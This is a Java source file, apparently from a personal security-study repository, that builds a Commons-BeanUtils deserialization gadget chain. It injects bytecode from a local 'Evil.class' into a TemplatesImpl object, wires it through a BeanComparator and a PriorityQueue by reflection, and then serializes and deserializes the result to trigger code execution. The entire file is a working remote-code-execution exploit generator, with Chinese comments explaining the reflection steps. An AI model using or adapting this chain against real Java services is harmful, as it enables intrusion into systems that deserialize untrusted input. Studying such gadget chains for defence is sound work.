package com.rain;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.PriorityQueue;

public class CB2 {
    public static void main(String[] args) throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name","abc");
        setFieldValue(templates,"_tfactory",new TransformerFactoryImpl());
        byte[] evil = Files.readAllBytes(Paths.get("/Users/long/Documents/github_doc/security_db/Java_relevant/code/gadget/CB_chains/src/main/java/Evil.class"));
        byte[][] code={ evil };
        setFieldValue(templates,"_bytecodes",code);
        //   PropertyUtils.getProperty(templates,"outputProperties");
        BeanComparator beanComparator = new BeanComparator(null,String.CASE_INSENSITIVE_ORDER);
        PriorityQueue priorityQueue = new PriorityQueue(beanComparator);
        priorityQueue.add("1");
        priorityQueue.add("2");
        //通过 反射修改 BeanComparator 的值property的内容改成 outputProperties
        setFieldValue(beanComparator,"property","outputProperties");
        //通过反射 PriorityQueue修改  queue值 为 TemplatesImpl对象
        setFieldValue(priorityQueue,"queue",new Object[]{templates,templates});

        Utils.serialize(priorityQueue);
        Utils.deserialize();
    }
    public static void setFieldValue(Object object,String field_name,Object filed_value) throws NoSuchFieldException, IllegalAccessException {
        Class clazz=object.getClass();
        Field declaredField=clazz.getDeclaredField(field_name);
        declaredField.setAccessible(true);
        declaredField.set(object,filed_value);
    }
}
